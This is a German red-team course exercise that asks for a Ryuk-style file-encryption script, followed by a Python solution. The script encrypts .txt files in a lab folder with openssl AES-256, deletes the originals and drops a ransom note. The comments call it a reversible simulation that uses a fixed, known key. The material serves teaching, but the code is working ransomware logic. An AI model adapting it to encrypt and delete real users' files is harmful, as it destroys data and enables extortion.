## Übung 1.2 (Ryuk - Red Team) 
```
Red Team = Angreifer        
Erstelle ein bash Script das mehrere Dateinamen als Argumente akzeptiert und diese Dateien nach der von Ryuk angewendeten Strategie verschlüsselt. Verwende openssl.        
Z.B. alle Dateien im Verzeichnis verschlüsseln:         
$ ryuk_ransom *        
Nach dem Verschlüsseln aller Daten soll eine furchterregende "Ransom Note" ausgegeben    
```

Python-Script, was die Daten verschlüsselt. 
```
#!/usr/bin/env python3
# Lern-Simulation mit echtem AES via OpenSSL.
# NUR im isolierten Ordner ~/lab/opfer verwenden.
# Fester, bekannter Schluessel -> jederzeit umkehrbar. KEINE echte Ransomware.

import subprocess
from pathlib import Path

ZIELORDNER = Path.home() / "lab" / "opfer"
PASSWORT = "lab-demo-passwort-42"   # bewusst bekannt und fest
ENDUNG = ".RYUKSIM"

def openssl(args, eingabe: Path, ausgabe: Path):
    # -pbkdf2: moderne Schluesselableitung, unterdrueckt die OpenSSL-Warnung
    subprocess.run(
        ["openssl", "enc", *args, "-aes-256-cbc", "-pbkdf2",
         "-pass", f"pass:{PASSWORT}",
         "-in", str(eingabe), "-out", str(ausgabe)],
        check=True,
    )

def verschluesseln_datei(pfad: Path):
    ziel = pfad.with_suffix(pfad.suffix + ENDUNG)
    openssl(["-e"], pfad, ziel)     # -e = encrypt
    pfad.unlink()                   # Original entfernen (Lab: Snapshot vorhanden)
    print(f"[+] verschluesselt: {pfad.name} -> {ziel.name}")

def entschluesseln_datei(pfad: Path):
    original = pfad.with_suffix("")  # .RYUKSIM entfernen
    openssl(["-d"], pfad, original)  # -d = decrypt
    pfad.unlink()
    print(f"[+] wiederhergestellt: {pfad.name} -> {original.name}")

def note_ablegen():
    note = ZIELORDNER / "RyukReadMe.txt"
    note.write_text(
        "SIMULATION - Deine Testdateien wurden fuer die Uebung mit AES-256\n"
        "'verschluesselt'. Dies ist KEINE echte Ransomware. Der Schluessel ist\n"
        "bekannt; entschluesseln() stellt alles wieder her.\n"
    )
    print(f"[+] Ransom-Note abgelegt: {note.name}")

def verschluesseln():
    for p in ZIELORDNER.glob("*.txt"):
        verschluesseln_datei(p)
    note_ablegen()

def entschluesseln():
    for p in ZIELORDNER.glob("*" + ENDUNG):
        entschluesseln_datei(p)
    print("[+] Wiederherstellung abgeschlossen")

if __name__ == "__main__":
    verschluesseln()
```
